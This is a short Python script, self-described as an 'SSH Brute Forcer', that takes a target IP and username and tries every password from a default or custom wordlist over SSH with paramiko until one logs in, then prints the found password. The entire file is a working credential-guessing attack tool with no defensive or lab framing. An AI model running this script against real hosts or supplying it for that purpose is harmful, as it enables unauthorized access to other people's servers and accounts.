import paramiko
import os

def Default():
    print("Using the default password list.")
    Ip = input("Enter the IP Address: ")
    Usr = input("Enter the Username: ")
    with open('password-list.txt', 'r') as file:
        for password in file:
            password = password.strip()
            try:
                #ip = input("Enter the IP Address: ")
                #Username = input("Enter the Username: ")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                print(f"Using IP: [{Ip}] with Username: [{Usr}]")
                ssh.connect(Ip, username=Usr, password=password, timeout=3)
                print(f"Password Found: {password}")
                break
            except paramiko.AuthenticationException:
                print(f"Failed with password: {password}")
            except Exception as e:
                print(f"[!] Error: {str(e)}")

    ssh.close()

def Custom():
    print("Using a custom password list.")
    File = input("What is the path to your password list?: ")
    if not os.path.exists(File):
        print("File does not exist. Please Check the path and try again.")
        return
    Ip = input("Enter the IP Address: ")
    Usr = input("Enter the Username: ")
    with open(File, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                print(f"Using IP: [{Ip}] with Username: [{Usr}]")
                ssh.connect(Ip, username=Usr, password=password, timeout=3)
                print(f"Password Found: [{password}]")
                break
            except paramiko.AuthenticationException:
                print(f"Failed with password: {password}")
            except Exception as e:
                print(f"[!] Error: {str(e)}")


    ssh.close()

def main():
    print("Welcome to the SSH Brute Forcer! \n")
    Choice = input("Do you want to use the default password list or a custom one? (default/custom): ").strip().lower()
    if Choice == "default":
        Default()
    elif Choice == "custom":
        Custom()
    else:
        print("Invalid choice. Please enter 'default' or 'custom")
main()